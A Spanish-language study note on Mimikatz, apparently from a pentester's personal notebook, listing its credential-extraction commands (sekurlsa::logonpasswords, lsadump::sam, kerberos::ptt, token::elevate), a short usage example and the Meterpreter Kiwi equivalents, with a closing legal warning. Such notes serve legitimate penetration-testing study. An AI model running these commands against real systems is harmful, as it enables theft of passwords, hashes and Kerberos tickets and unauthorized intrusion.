# 🧠 Mimikatz - Extracción avanzada de credenciales

**Mimikatz** es una herramienta de post-explotación desarrollada por **Benjamin Delpy** que permite extraer credenciales, hashes, certificados y tickets de un sistema Windows.

## 🧬 ¿Para qué sirve?

Con Mimikatz se puede:

- Obtener contraseñas en texto claro desde memoria
- Volcar hashes de usuario (LM/NTLM)
- Acceder a secretos de LSA
- Ver e inyectar tickets Kerberos
- Elevar privilegios usando tokens

## ⚙️ Funcionalidades principales

| Comando                       | Función |
|------------------------------|--------|
| `sekurlsa::logonpasswords`   | Extrae contraseñas y hashes desde LSASS |
| `lsadump::sam`               | Volca hashes del archivo SAM |
| `lsadump::lsa`               | Extrae secretos guardados por el sistema |
| `kerberos::list`             | Lista tickets Kerberos |
| `kerberos::ptt`              | Inyecta un ticket (Pass-The-Ticket) |
| `token::elevate`             | Eleva privilegios con tokens impersonados |
| `privilege::debug`           | Habilita privilegios requeridos para ejecutar comandos |

## 🖥️ Requisitos

- Ejecutar como **Administrador** o **SYSTEM**
- Puede requerir desactivar protecciones como:
  - Credential Guard
  - LSA Protection

## 🧪 Ejemplo de uso

````powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
````

---

## 🔄 Relación con Metasploit

En Metasploit, podés usar **Kiwi**, una versión embebida de Mimikatz dentro de `meterpreter`, sin subir binarios.

```bash
meterpreter > load kiwi
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

## 🛡️ Precauciones legales

Mimikatz es una herramienta poderosa que **debe usarse solo en entornos autorizados**. Su uso en sistemas sin permiso es **ilegal** y puede traer consecuencias penales.

> ✅ Ideal para pentesters, red teams, análisis forense y laboratorios de seguridad.

[[apuntes/herramientas/herramientas]]